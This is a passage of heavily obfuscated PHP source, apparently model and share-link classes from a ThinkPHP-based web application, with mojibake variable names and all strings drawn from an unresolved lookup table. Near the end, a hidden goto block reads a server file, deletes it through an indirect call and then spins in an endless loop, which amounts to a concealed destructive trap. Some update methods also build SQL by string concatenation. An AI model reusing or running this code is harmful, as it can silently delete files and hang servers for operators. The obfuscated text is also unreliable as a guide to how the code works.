$ó‡¶»À†)->select(); } if (!is_array($ÑØ­½)) { $ÑØ­½ = array(); } if ($Îñåòü¡ == 1) { $ÁÂª´û¬ = count($ÑØ­½); } $ öšêÃ§ = array($¬ùà ¬º[366] => array($¬ùà ¬º[367] => $ÁÂª´û¬, $¬ùà ¬º[363] => $ó‡¶»À†, $¬ùà ¬º[353] => $Øç¿Û­Í, $¬ùà ¬º[368] => $Îñåòü¡), $¬ùà ¬º[369] => $ÑØ­½); return $ öšêÃ§; } protected function checkLength($ä•Õº¥·, $ ÚâŞº‡ = 0, $ÏÓØø½Ü = '') { $¶×¨ñëÄ =& $_SERVER[şÒÁøÒÄ]; $ ÚâŞº‡ = $ ÚâŞº‡ ? $ ÚâŞº‡ : 65536; if (!$ä•Õº¥· || strlen($ä•Õº¥·) < $ ÚâŞº‡) { return; } $ÏÓØø½Ü = $ÏÓØø½Ü ? $ÏÓØø½Ü . $¶×¨ñëÄ[71] : $¶×¨ñëÄ[12]; show_json($ÏÓØø½Ü . LNG($¶×¨ñëÄ[370]) . "\50{$ ÚâŞº‡}\x29", !1); } protected function metaSet($¥ãÂ‹¼ß, $ı§¸ŞĞ™ = null, $¤ôÜö“ = null) { $­œëÀÑÑ =& $_SERVER[şÒÁøÒÄ]; if (!$this->tableMeta || !$¥ãÂ‹¼ß) { return !1; } $ÁšÛÖ×ş = $this->tableMeta[$­œëÀÑÑ[371]]; $˜Ô’ä³À = $this->tableMeta[$­œëÀÑÑ[372]]; $„–ßëÅó = Model($˜Ô’ä³À); $æšÏç¸À = array($ÁšÛÖ×ş => $¥ãÂ‹¼ß, $­œëÀÑÑ[373] => $ı§¸ŞĞ™); if (is_null($ı§¸ŞĞ™)) { return $„–ßëÅó->where(array($ÁšÛÖ×ş => $¥ãÂ‹¼ß))->delete(); } if (is_null($¤ôÜö“) && is_string($ı§¸ŞĞ™)) { return $„–ßëÅó->where($æšÏç¸À)->delete(); } $¨Ò×òÙ = is_array($ı§¸ŞĞ™) ? $ı§¸ŞĞ™ : array(); if (is_string($ı§¸ŞĞ™)) { $¨Ò×òÙ[$ı§¸ŞĞ™] = $¤ôÜö“; } $ïÓïÈŞ = array(); foreach ($¨Ò×òÙ as $ˆŒÆÓ× => $›·ÉéÄ’) { if (is_null($›·ÉéÄ’) && is_string($ˆŒÆÓ×)) { $„–ßëÅó->where(array($ÁšÛÖ×ş => $¥ãÂ‹¼ß, $­œëÀÑÑ[373] => $ˆŒÆÓ×))->delete(); continue; } $this->checkLength($›·ÉéÄ’, !1, $˜Ô’ä³À . $­œëÀÑÑ[4] . $ˆŒÆÓ×); $ïÓïÈŞ[] = array($ÁšÛÖ×ş => $¥ãÂ‹¼ß, $­œëÀÑÑ[94] => $ˆŒÆÓ×, $­œëÀÑÑ[374] => $›·ÉéÄ’); } $ØÕ°‹ğ = $­œëÀÑÑ[375] . $˜Ô’ä³À; CacheLock::lock($ØÕ°‹ğ); $„–ßëÅó->where(array($ÁšÛÖ×ş => $¥ãÂ‹¼ß))->addAll($ïÓïÈŞ, array(), !0); CacheLock::unlock($ØÕ°‹ğ); return !0; } public function metaGet($«ÛÌúèî, $ÁûÃÀñ = false) { $Í˜İš¦ =& $_SERVER[şÒÁøÒÄ]; if (!$this->tableMeta) { return array(); } $Ğ½°¢áı = $this->tableMeta[$Í˜İš¦[371]]; $‘£Ú²’ = Model($this->tableMeta[$Í˜İš¦[372]]); if ($ÁûÃÀñ) { $éÛÒÌ× = array($Ğ½°¢áı => $«ÛÌúèî, $Í˜İš¦[94] => $ÁûÃÀñ); return $‘£Ú²’->where($éÛÒÌ×)->getField($Í˜İš¦[374]); } $éÛÒÌ× = array($Ğ½°¢áı => $«ÛÌúèî); $ÏÚÀôáœ = $‘£Ú²’->field($Í˜İš¦[376])->where($éÛÒÌ×)->select(); $ÏÚÀôáœ = array_to_keyvalue($ÏÚÀôáœ, $Í˜İš¦[94], $Í˜İš¦[374]); return $ÏÚÀôáœ; } private function checkDataAutoHas($ÀÉñîÁ‚) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ëşßó€ó) { if (in_array($ÀÉñîÁ‚, explode($_SERVER[şÒÁøÒÄ][50], $ëşßó€ó[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$ßó ˜Îó, $”Ê»ïù´) { $ßÇìŞÙš =& $_SERVER[şÒÁøÒÄ]; if (!is_array($ßó ˜Îó)) { return; } foreach ($this->dataAuto as $ƒåÍ ±Û) { $ş÷ä…Éí = $ƒåÍ ±Û[0]; if (!in_array($”Ê»ïù´, explode($ßÇìŞÙš[50], $ƒåÍ ±Û[2]))) { continue; } switch (trim($ƒåÍ ±Û[3])) { case $ßÇìŞÙš[321]: case $ßÇìŞÙš[322]: $ï½ô¯ôÌ = $ƒåÍ ±Û[1]; $®Ùø»ˆ = isset($ƒåÍ ±Û[4]) ? (array) $ƒåÍ ±Û[4] : array(); if ($ï½ô¯ôÌ == $ßÇìŞÙš[180] && array_key_exists($ş÷ä…Éí, $ßó ˜Îó)) { if (!$ßó ˜Îó[$ş÷ä…Éí]) { unset($ßó ˜Îó[$ş÷ä…Éí]); } break; } if (isset($ßó ˜Îó[$ş÷ä…Éí])) { array_unshift($®Ùø»ˆ, $ßó ˜Îó[$ş÷ä…Éí]); } if ($ßÇìŞÙš[321] == $ƒåÍ ±Û[3]) { $ßó ˜Îó[$ş÷ä…Éí] = call_user_func_array($ï½ô¯ôÌ, $®Ùø»ˆ); } else { $ßó ˜Îó[$ş÷ä…Éí] = call_user_func_array(array(&$this, $ï½ô¯ôÌ), $®Ùø»ˆ); } break; case $ßÇìŞÙš[270]: if (isset($ßó ˜Îó[$ş÷ä…Éí]) && $ßó ˜Îó[$ş÷ä…Éí]) { $ßó ˜Îó[$ş÷ä…Éí] = call_user_func_array(array(&$this, $ƒåÍ ±Û[1]), array($ßó ˜Îó[$ş÷ä…Éí])); } break; case $ßÇìŞÙš[273]: $ßó ˜Îó[$ş÷ä…Éí] = $ßó ˜Îó[$ƒåÍ ±Û[1]]; break; case $ßÇìŞÙš[294]: if (isset($ßó ˜Îó[$ş÷ä…Éí]) && !is_string($ßó ˜Îó[$ş÷ä…Éí])) { $ßó ˜Îó[$ş÷ä…Éí] = json_encode_force($ßó ˜Îó[$ş÷ä…Éí]); } break; case $ßÇìŞÙš[323]: if ($ßó ˜Îó[$ş÷ä…Éí] === $ßÇìŞÙš[12]) { unset($ßó ˜Îó[$ş÷ä…Éí]); } break; case $ßÇìŞÙš[324]: $ßó ˜Îó[$ş÷ä…Éí] = $ƒåÍ ±Û[1]; default: break; } } if ($”Ê»ïù´ == $ßÇìŞÙš[355]) { $ÉËõæô‡ = strtolower($this->db->getDbType()); if (strpos($ÉËõæô‡, $ßÇìŞÙš[13]) !== 0) { return; } $õ³Œ¡¬Ä = $this->field(!0)->fields; $ëÖ¶şëË = $õ³Œ¡¬Ä[$ßÇìŞÙš[252]]; if (isset($õ³Œ¡¬Ä[$ßÇìŞÙš[251]])) { unset($ëÖ¶şëË[$õ³Œ¡¬Ä[$ßÇìŞÙš[251]]]); } foreach ($ëÖ¶şëË as $òÅÉ ‚Ù => $”Ê»ïù´) { if (!isset($ßó ˜Îó[$òÅÉ ‚Ù])) { $ßó ˜Îó[$òÅÉ ‚Ù] = $ßÇìŞÙš[12]; } } } } private function dataAfterFilter(&$§—Áª½) { $ß¨å¼Ç =& $_SERVER[şÒÁøÒÄ]; foreach ($this->dataAuto as $¶Ê †Äí) { $ù‰üà‹± = $¶Ê †Äí[0]; if (!isset($§—Áª½[$ù‰üà‹±])) { continue; } if (!in_array($ß¨å¼Ç[357], explode($ß¨å¼Ç[50], $¶Ê †Äí[2]))) { continue; } switch (trim($¶Ê †Äí[3])) { case $ß¨å¼Ç[321]: case $ß¨å¼Ç[322]: $Ö¿„‰åş = isset($¶Ê †Äí[4]) ? (array) $¶Ê †Äí[4] : array(); array_unshift($Ö¿„‰åş, $§—Áª½[$ù‰üà‹±]); if (isset($¶Ê †Äí[4]) && $¶Ê †Äí[4] == $ß¨å¼Ç[377]) { $Ö¿„‰åş = array($§—Áª½[$ù‰üà‹±]); } if ($ß¨å¼Ç[321] == $¶Ê †Äí[3]) { $§—Áª½[$ù‰üà‹±] = call_user_func_array($¶Ê †Äí[1], $Ö¿„‰åş); } else { $§—Áª½[$ù‰üà‹±] = call_user_func_array(array(&$this, $¶Ê †Äí[1]), $Ö¿„‰åş); } break; case $ß¨å¼Ç[270]: if (isset($§—Áª½[$ù‰üà‹±]) && $§—Áª½[$ù‰üà‹±]) { $§—Áª½[$ù‰üà‹±] = call_user_func_array(array(&$this, $¶Ê †Äí[1]), array($§—Áª½[$ù‰üà‹±])); } break; case $ß¨å¼Ç[273]: $§—Áª½[$ù‰üà‹±] = $§—Áª½[$¶Ê †Äí[1]]; break; case $ß¨å¼Ç[294]: $É¨ÊÇÊ = $§—Áª½[$ù‰üà‹±]; $§—Áª½[$ù‰üà‹±] = json_decode($É¨ÊÇÊ, !0); if (is_null($§—Áª½[$ù‰üà‹±])) { $§—Áª½[$ù‰üà‹±] = $É¨ÊÇÊ; } break; case $ß¨å¼Ç[323]: if ($§—Áª½[$ù‰üà‹±] === $ß¨å¼Ç[12]) { unset($§—Áª½[$ù‰üà‹±]); } break; case $ß¨å¼Ç[324]: $§—Áª½[$ù‰üà‹±] = $¶Ê †Äí[1]; break; default: break; } } } public function saveAll($¡¼»â¶Ï) { $Œ˜„¶ÒÑ =& $_SERVER[şÒÁøÒÄ]; $²ÖƒÂŸú = $this->tablePrefix . $this->tableName; $¬ñ’Á• = self::SQL_WHERE_IN_CHUNK; $¡¼»â¶Ï = is_array($¡¼»â¶Ï) ? $¡¼»â¶Ï : array(); $ú½øŞŒ = $Œ˜„¶ÒÑ[378]; $šÍÈÜ¾Ä = 0; $Ÿüğ¢–” = array(); $¿¾ŠÌ¥ = count($¡¼»â¶Ï); for ($ì®´‹í¡ = 0; $ì®´‹í¡ < $¿¾ŠÌ¥; $ì®´‹í¡++) { $‹²åÕ¶õ = $¡¼»â¶Ï[$ì®´‹í¡]; if (!is_array($‹²åÕ¶õ) || count($‹²åÕ¶õ) != 4) { continue; } $ˆ—­˜Îà = "\x55\120\104\101\x54\105\40\x60{$²ÖƒÂŸú}\140\x20\123\x45\124\x20{$‹²åÕ¶õ[2]}\x20\75\x20\x43\x41\x53\x45\x20{$‹²åÕ¶õ[0]}\x20\xa"; if ($šÍÈÜ¾Ä == 0) { $ú½øŞŒ = $ˆ—­˜Îà; } $Ÿüğ¢–”[] = $Œ˜„¶ÒÑ[118] . $‹²åÕ¶õ[1] . $Œ˜„¶ÒÑ[118]; $šÍÈÜ¾Ä++; $ú½øŞŒ .= "\x20\127\110\105\116\x20\47{$‹²åÕ¶õ[1]}\x27\40\124\x48\105\x4e\40\x27{$‹²åÕ¶õ[3]}\x27\40\xa"; if ($šÍÈÜ¾Ä == $¬ñ’Á• || $ì®´‹í¡ == $¿¾ŠÌ¥ - 1) { $Ê½Å»» = implode($Œ˜„¶ÒÑ[50], $Ÿüğ¢–”); $ú½øŞŒ .= "\40\x45\116\x44\40\x20\x57\x48\105\x52\105\40{$‹²åÕ¶õ[0]}\40\x49\x4e\x20\x28{$Ê½Å»»}\x29\x20"; $this->execute($ú½øŞŒ); $šÍÈÜ¾Ä = 0; $ú½øŞŒ = $ˆ—­˜Îà; $this->chunkEventCheck(count($Ÿüğ¢–”)); $Ÿüğ¢–” = array(); } } $this->chunkEventSet(); } public function saveAllEach($º¶¡Ë‚½) { $€€Üğñ =& $_SERVER[şÒÁøÒÄ]; $âÅÚ™äı = $this->tablePrefix . $this->tableName; foreach ($º¶¡Ë‚½ as $ êêË) { if (!is_array($ êêË) || count($ êêË) != 4) { continue; } $¦Š¿éİÖ = $ êêË[0] . $€€Üğñ[379] . $ êêË[1] . $€€Üğñ[118]; $°ÚºÊï™ = $ êêË[2] . $€€Üğñ[379] . $ êêË[3] . $€€Üğñ[118]; $µ¢ÍÅĞÅ = "\165\160\x64\141\164\145\x20{$âÅÚ™äı}\x20\163\145\x74\x20{$°ÚºÊï™}\x20\167\150\x65\162\145\40{$¦Š¿éİÖ}\x3b"; $this->execute($µ¢ÍÅĞÅ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÀÓ¶Ÿ’» = false, $«ÂÈÚÜÜ = false) { $this->_chunkEvent = $ÀÓ¶Ÿ’»; $this->_chunkEventParam = $«ÂÈÚÜÜ; } private function chunkEventCheck($¦‘ğ¿ƒ‰) { if (!$this->_chunkEvent) { return; } $·œ“’ÉÑ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $·œ“’ÉÑ[$_SERVER[şÒÁøÒÄ][380]] = $¦‘ğ¿ƒ‰; Hook::trigger($this->_chunkEvent, $·œ“’ÉÑ); } public function addAll($Ğ¢‹ï×, $ã¿Š™ã = array(), $òÔâ§Ø = false) { $şèÕûŠ« =& $_SERVER[şÒÁøÒÄ]; ignore_timeout(); $‹Ë¥‡Æ’ = self::SQL_WHERE_IN_CHUNK; if (empty($Ğ¢‹ï×)) { $this->error = think_lang($şèÕûŠ«[271]); return !1; } $ã¿Š™ã = $this->_parseOptions($ã¿Š™ã); foreach ($Ğ¢‹ï× as $İ¥Û­á¬ => $…âşšœÕ) { $Ğ¢‹ï×[$İ¥Û­á¬] = $this->_facade($…âşšœÕ); $this->_beforeInsert($Ğ¢‹ï×[$İ¥Û­á¬], $ã¿Š™ã); } if (method_exists($this->db, $şèÕûŠ«[272])) { for ($ì‚Õ§º = 0; $ì‚Õ§º < count($Ğ¢‹ï×); $ì‚Õ§º += $‹Ë¥‡Æ’) { $¤˜÷Õ½ = array_slice($Ğ¢‹ï×, $ì‚Õ§º, $‹Ë¥‡Æ’); if (!is_array($¤˜÷Õ½) || count($¤˜÷Õ½) == 0) { break; } $Ù‡é¿½’ = $this->db->insertAll($¤˜÷Õ½, $ã¿Š™ã, $òÔâ§Ø); $this->chunkEventCheck(count($¤˜÷Õ½)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Ğ¢‹ï× as $İ¥Û­á¬ => $…âşšœÕ) { $Ù‡é¿½’ = $this->db->insert($…âşšœÕ, $ã¿Š™ã, $òÔâ§Ø); } $this->commit(); } if (!1 !== $Ù‡é¿½’) { $êÒ‚¥ã = $this->getLastInsID(); if ($êÒ‚¥ã) { return $êÒ‚¥ã; } } return $Ù‡é¿½’; } public function save($şŞØƒ‰’ = '', $´¦‰ÈÛ = array()) { $ÙñˆİğÚ =& $_SERVER[şÒÁøÒÄ]; $—º’·Ã = self::SQL_WHERE_IN_CHUNK; $»†Àå• = $this->optionsValue(); $ïï›¢Ğ = $this->findWhereField($»†Àå•); if (!$ïï›¢Ğ) { return parent::save($şŞØƒ‰’, $´¦‰ÈÛ); } $º‹ñ¹ìÄ = 0; $ä¹×ß÷¹ = $»†Àå•[$ÙñˆİğÚ[275]][$ïï›¢Ğ][1]; $ä¹×ß÷¹ = is_array($ä¹×ß÷¹) ? $ä¹×ß÷¹ : array(); $Ò™ˆºÖ§ = count($ä¹×ß÷¹); for ($³ğ©¯ôĞ = 0; $³ğ©¯ôĞ < $Ò™ˆºÖ§; $³ğ©¯ôĞ += $—º’·Ã) { $İ¤¿¬İÎ = array_slice($ä¹×ß÷¹, $³ğ©¯ôĞ, $—º’·Ã); if (!is_array($İ¤¿¬İÎ) || count($İ¤¿¬İÎ) == 0) { break; } $»†Àå•[$ÙñˆİğÚ[275]][$ïï›¢Ğ][1] = $İ¤¿¬İÎ; $this->optionsValue($»†Àå•); $º‹ñ¹ìÄ += parent::save($şŞØƒ‰’, $´¦‰ÈÛ); $this->chunkEventCheck(count($İ¤¿¬İÎ)); } $this->chunkEventSet(); return $º‹ñ¹ìÄ; } public function add($ÉÕü´â = '', $†½íÉµÏ = array(), $‰“ÑÊ—Ç = false) { if ($this->addTaskStatus && is_array($ÉÕü´â)) { $this->addTaskData[] = $ÉÕü´â; return; } return parent::add($ÉÕü´â, $†½íÉµÏ, $‰“ÑÊ—Ç); } public function parseWhereLike($ş¶™î¦, $­“§…Ú = '', $ğÅóšÚĞ = false, &$çü†Ÿº¨ = false) { $ªŠÇ‰¾ˆ =& $_SERVER[şÒÁøÒÄ]; $òï¤†Û” = $GLOBALS[$ªŠÇ‰¾ˆ[6]][$ªŠÇ‰¾ˆ[381]]; if (!$òï¤†Û”[$ªŠÇ‰¾ˆ[382]]) { return $ş¶™î¦; } if (!is_array($ş¶™î¦)) { return $ş¶™î¦; } $ãƒÉÒü» = array(); $ñ«ÔÔ”í = 0; foreach ($ş¶™î¦ as $—ıŸ¥Ç½ => $ï¹çãÆ) { if (is_array($ï¹çãÆ) && count($ï¹çãÆ) == 2 && $ï¹çãÆ[0] == $ªŠÇ‰¾ˆ[383] && is_string($ï¹çãÆ[1]) && substr($ï¹çãÆ[1], 0, 1) == $ªŠÇ‰¾ˆ[384] && substr($ï¹çãÆ[1], strlen($ï¹çãÆ[1]) - 1, 1) == $ªŠÇ‰¾ˆ[384]) { $çü†Ÿº¨ = !0; $ñÑµü­Ã = is_string($—ıŸ¥Ç½) ? $—ıŸ¥Ç½ : $­“§…Ú; $î’Ê‰¢Û = substr($ï¹çãÆ[1], 1, strlen($ï¹çãÆ[1]) - 2); $î’Ê‰¢Û = $this->db->escapeString($î’Ê‰¢Û); if (!strpos($ñÑµü­Ã, $ªŠÇ‰¾ˆ[10])) { $ñÑµü­Ã = $ªŠÇ‰¾ˆ[385] . $ñÑµü­Ã . $ªŠÇ‰¾ˆ[385]; } $¸Şã©‰ = $ªŠÇ‰¾ˆ[189] . $î’Ê‰¢Û . $ªŠÇ‰¾ˆ[189]; $î’Ê‰¢Û = str_replace(array($ªŠÇ‰¾ˆ[10], $ªŠÇ‰¾ˆ[386], $ªŠÇ‰¾ˆ[11]), $ªŠÇ‰¾ˆ[387], $î’Ê‰¢Û); if ($òï¤†Û”[$ªŠÇ‰¾ˆ[388]]) { $¸Şã©‰ = $ªŠÇ‰¾ˆ[389] . $î’Ê‰¢Û . $ªŠÇ‰¾ˆ[390]; if ($òï¤†Û”[$ªŠÇ‰¾ˆ[391]]) { $¸Şã©‰ = $ªŠÇ‰¾ˆ[390] . $î’Ê‰¢Û . $ªŠÇ‰¾ˆ[389]; } } $ãƒÉÒü»[$ñ«ÔÔ”í] = $ªŠÇ‰¾ˆ[392] . $ñÑµü­Ã . $ªŠÇ‰¾ˆ[393] . $¸Şã©‰ . $ªŠÇ‰¾ˆ[394]; $ñ«ÔÔ”í++; continue; } if (is_array($ï¹çãÆ)) { $­“§…Ú = is_string($—ıŸ¥Ç½) ? $—ıŸ¥Ç½ : $­“§…Ú; $ï¹çãÆ = $this->parseWhereLike($ï¹çãÆ, $­“§…Ú, !0, $çü†Ÿº¨); } if (is_numeric($—ıŸ¥Ç½)) { $ãƒÉÒü»[$ñ«ÔÔ”í] = $ï¹çãÆ; $ñ«ÔÔ”í++; } else { $ãƒÉÒü»[$—ıŸ¥Ç½] = $ï¹çãÆ; } } if ($çü†Ÿº¨ && !$ğÅóšÚĞ) { } return $ãƒÉÒü»; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($î¬àï®‘ = array()) { $Öœš×“† =& $_SERVER[şÒÁøÒÄ]; $³û¡Âş¦ = self::SQL_WHERE_IN_CHUNK; $şºî˜ÑÚ = $this->optionsValue(); $œàù…‡œ = $this->findWhereField($şºî˜ÑÚ); if (!$œàù…‡œ || isset($şºî˜ÑÚ[$Öœš×“†[292]]) || isset($şºî˜ÑÚ[$Öœš×“†[353]])) { return parent::select($î¬àï®‘); } $Á§ªà× = $şºî˜ÑÚ[$Öœš×“†[275]][$œàù…‡œ][1]; $Á§ªà× = is_array($Á§ªà×) ? $Á§ªà× : array(); $Ãæ‘›àÒ = null; for ($ˆî½ô‰© = 0; $ˆî½ô‰© < count($Á§ªà×); $ˆî½ô‰© += $³û¡Âş¦) { $ÂØË¨ĞÅ = array_slice($Á§ªà×, $ˆî½ô‰©, $³û¡Âş¦); if (!is_array($ÂØË¨ĞÅ) || count($ÂØË¨ĞÅ) == 0) { break; } $şºî˜ÑÚ[$Öœš×“†[275]][$œàù…‡œ][1] = $ÂØË¨ĞÅ; $this->optionsValue($şºî˜ÑÚ); $à—Ş¼­´ = parent::select($î¬àï®‘); if (!$à—Ş¼­´) { continue; } $Ãæ‘›àÒ = is_array($Ãæ‘›àÒ) ? $Ãæ‘›àÒ : array(); $Ãæ‘›àÒ = array_merge($Ãæ‘›àÒ, $à—Ş¼­´); } return $Ãæ‘›àÒ; } public function delete($ùñ…Ì­² = array()) { $è£÷ë =& $_SERVER[şÒÁøÒÄ]; $¬³âÄŠ = self::SQL_WHERE_IN_CHUNK; $²îå“Ã = $this->optionsValue(); $¼üÎÓ• = $this->findWhereField($²îå“Ã); if (!$¼üÎÓ•) { return parent::delete($ùñ…Ì­²); } $ÓíÕÑ˜Û = 0; $¸ Æ¸ğ = $²îå“Ã[$è£÷ë[275]][$¼üÎÓ•][1]; $¸ Æ¸ğ = is_array($¸ Æ¸ğ) ? $¸ Æ¸ğ : array(); for ($Â²Ó½ôñ = 0; $Â²Ó½ôñ < count($¸ Æ¸ğ); $Â²Ó½ôñ += $¬³âÄŠ) { $¢‹·Å´œ = array_slice($¸ Æ¸ğ, $Â²Ó½ôñ, $¬³âÄŠ); if (!is_array($¢‹·Å´œ) || count($¢‹·Å´œ) == 0) { break; } $²îå“Ã[$è£÷ë[275]][$¼üÎÓ•][1] = $¢‹·Å´œ; $this->optionsValue($²îå“Ã); $ÓíÕÑ˜Û += parent::delete($ùñ…Ì­²); } return $ÓíÕÑ˜Û; } private function findWhereField($«ÂÌñ˜Ï) { $”ûş ´— =& $_SERVER[şÒÁøÒÄ]; $±ŠÒÃçİ = self::SQL_WHERE_IN_CHUNK; if (!is_array($«ÂÌñ˜Ï) || !is_array($«ÂÌñ˜Ï[$”ûş ´—[275]])) { return !1; } foreach ($«ÂÌñ˜Ï[$”ûş ´—[275]] as $ªˆˆĞˆÜ => $”€„ÖûÚ) { if (is_array($”€„ÖûÚ) && isset($”€„ÖûÚ[0]) && is_string($”€„ÖûÚ[0]) && strtolower($”€„ÖûÚ[0]) == $”ûş ´—[7] && is_array($”€„ÖûÚ[1]) && count($”€„ÖûÚ[1]) > $±ŠÒÃçİ) { ignore_timeout(); return $ªˆˆĞˆÜ; } } return !1; } public function setMasterDB($Ü‹ï›¬¼ = true) { think_config($_SERVER[şÒÁøÒÄ][395], $Ü‹ï›¬¼); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\117\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($ÆæßÅ• = false, $‡’²âû = "\155\x6f\144\x69\146\171\x54\x69\155\145", $›ÛĞ¾ùÄ = false) { $°ığë±æ = Model($this->modelType)->get(!1, $this->optionType, !0); $¼©©Ú·® = array_values($°ığë±æ); if ($¼©©Ú·® && $¼©©Ú·®[0] && !is_array($¼©©Ú·®[0])) { Model($this->modelType)->cacheRemove($this->optionType); $°ığë±æ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$°ığë±æ) { return $ÆæßÅ• ? null : array(); } if (!$ÆæßÅ•) { $°ığë±æ = array_filter(array_values($°ığë±æ)); return array_sort_by($°ığë±æ, $‡’²âû, $›ÛĞ¾ùÄ); } return $°ığë±æ[$_SERVER[şÒÁøÒÄ][396] . $ÆæßÅ•]; } public function insert($ÆÕ±¹é˜) { $Ãá®Ÿ =& $_SERVER[şÒÁøÒÄ]; $ÆÕ±¹é˜ = array_field_key($ÆÕ±¹é˜, $this->field); $İ¶ÙĞÁï = Model($this->modelType)->get($Ãá®Ÿ[397], $this->optionType . $Ãá®Ÿ[398]); $İ¶ÙĞÁï = $İ¶ÙĞÁï ? $İ¶ÙĞÁï : 0; $ÆÕ±¹é˜[$Ãá®Ÿ[399]] = ++$İ¶ÙĞÁï; $ÆÕ±¹é˜[$Ãá®Ÿ[201]] = time(); $ÆÕ±¹é˜[$Ãá®Ÿ[85]] = time(); Model($this->modelType)->set($Ãá®Ÿ[397], $İ¶ÙĞÁï, $this->optionType . $Ãá®Ÿ[398]); Model($this->modelType)->set($Ãá®Ÿ[396] . $İ¶ÙĞÁï, $ÆÕ±¹é˜, $this->optionType); return $İ¶ÙĞÁï; } public function update($†Ÿó¶²Ç, $Ê’İ•Ä) { $¿¾±¦¾ğ =& $_SERVER[şÒÁøÒÄ]; $Ê’İ•Ä = array_field_key($Ê’İ•Ä, $this->field); $âÈİá”½ = $this->listData($†Ÿó¶²Ç); if (!$âÈİá”½ || !$†Ÿó¶²Ç) { return !1; } $Ê’İ•Ä = array_merge($âÈİá”½, $Ê’İ•Ä); $Ê’İ•Ä[$¿¾±¦¾ğ[85]] = time(); return Model($this->modelType)->set($¿¾±¦¾ğ[396] . $†Ÿó¶²Ç, $Ê’İ•Ä, $this->optionType); } public function remove($×¥ìÊà) { if (!$×¥ìÊà) { return !1; } return Model($this->modelType)->remove($_SERVER[şÒÁøÒÄ][396] . $×¥ìÊà, $this->optionType); } public function clear() { $®Ë¦¤ÚÅ =& $_SERVER[şÒÁøÒÄ]; Model($this->modelType)->remove($®Ë¦¤ÚÅ[397], $this->optionType . $®Ë¦¤ÚÅ[398]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Ö‚Ë˜¾ƒ, $öñß“Ô) { if (!$öñß“Ô) { return !1; } $û³ÑÇô = $this->listData(); $û³ÑÇô = array_to_keyvalue($û³ÑÇô, $Ö‚Ë˜¾ƒ); return isset($û³ÑÇô[$öñß“Ô]) ? $û³ÑÇô[$öñß“Ô] : !1; } public function findByName($µ¶€ü) { return $this->findByKey($_SERVER[şÒÁøÒÄ][32], $µ¶€ü); } protected function resetData($íÉšñŒ¢) { $›«¹¶‹ =& $_SERVER[şÒÁøÒÄ]; $íÉšñŒ¢ = is_array($íÉšñŒ¢) ? $íÉšñŒ¢ : array(); $›şæãË = array(); for ($å²â‘ªï = 0; $å²â‘ªï < count($íÉšñŒ¢); $å²â‘ªï++) { $›şæãË[$›«¹¶‹[396] . $íÉšñŒ¢[$å²â‘ªï][$›«¹¶‹[399]]] = $íÉšñŒ¢[$å²â‘ªï]; } return Model($this->modelType)->set($›şæãË, !1, $this->optionType); } private function getAutoName($™Å’ù‚¿) { $Ûáğò·ñ = array_to_keyvalue($this->listData(), $_SERVER[şÒÁøÒÄ][32]); if (!$Ûáğò·ñ || !isset($Ûáğò·ñ[$™Å’ù‚¿])) { return $™Å’ù‚¿; } for ($É³ç€ÚÔ = 1; $É³ç€ÚÔ < count($Ûáğò·ñ); $É³ç€ÚÔ++) { $ÃöŞ°« = $™Å’ù‚¿ . "\50{$É³ç€ÚÔ}\51"; if (!isset($Ûáğò·ñ[$ÃöŞ°«])) { return $ÃöŞ°«; } } return $ÃöŞ°«; } } goto FÁ†ÆÉÔí; cñÚÖ‰¦ñ: if (!isset($_SERVER[$_SERVER[şÒÁøÒÄ][887]]) || !isset($_SERVER[$_SERVER[şÒÁøÒÄ][1370]])) { $_getc = $_SERVER[şÒÁøÒÄ][889]; $_getfile = $_SERVER[$_SERVER[şÒÁøÒÄ][884]] . $_SERVER[şÒÁøÒÄ][885]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[şÒÁøÒÄ][231], $_getfilec); if (count($_getarrs) < $_SERVER[şÒÁøÒÄ][627]) { $exit = $_SERVER[şÒÁøÒÄ][890]; $exit(); } $_act = $_SERVER[şÒÁøÒÄ][1371]; $_act($_SERVER[$_SERVER[şÒÁøÒÄ][884]] . $_SERVER[şÒÁøÒÄ][885]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[şÒÁøÒÄ][378]); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($•ë½ì —) { $this->pathParse = $•ë½ì —; } protected function infoParse($Ï€à‹¤“, $•ˆúå = false) { $¾É¡ÂÁõ =& $_SERVER[şÒÁøÒÄ]; return Action($¾É¡ÂÁõ[1187])->sharePathInfo($this->pathParse[$¾É¡ÂÁõ[84]], !0, $•ˆúå); } public function listPath($ª—¤Ú€¨, $‘Åë½ü = false) { $ÇôÄÛĞ‰ =& $_SERVER[şÒÁøÒÄ]; $ÔùÈ•ı· = IO::listPath($ª—¤Ú€¨, $‘Åë½ü); if (!$ÔùÈ•ı·) { return $ÔùÈ•ı·; } if (is_array($ÔùÈ•ı·[$ÇôÄÛĞ‰[1361]])) { $Ã§ëÜ×í = Action($ÇôÄÛĞ‰[1372])->parsePathChildren($ÔùÈ•ı·[$ÇôÄÛĞ‰[1361]], array($ÇôÄÛĞ‰[421] => $ª—¤Ú€¨)); $ÔùÈ•ı·[$ÇôÄÛĞ‰[1361]] = Action($ÇôÄÛĞ‰[1187])->shareItemInfo($Ã§ëÜ×í); } foreach ($ÔùÈ•ı· as $óİÊˆ½ø => $Öòºœ¼) { if (!in_array($óİÊˆ½ø, array($ÇôÄÛĞ‰[83], $ÇôÄÛĞ‰[82]))) { continue; } foreach ($Öòºœ¼ as $€¡­Á ” => $Ã§ëÜ×í) { $Ã§ëÜ×í = Action($ÇôÄÛĞ‰[1372])->parsePathChildren($Ã§ëÜ×í, array($ÇôÄÛĞ‰[421] => $ª—¤Ú€¨)); 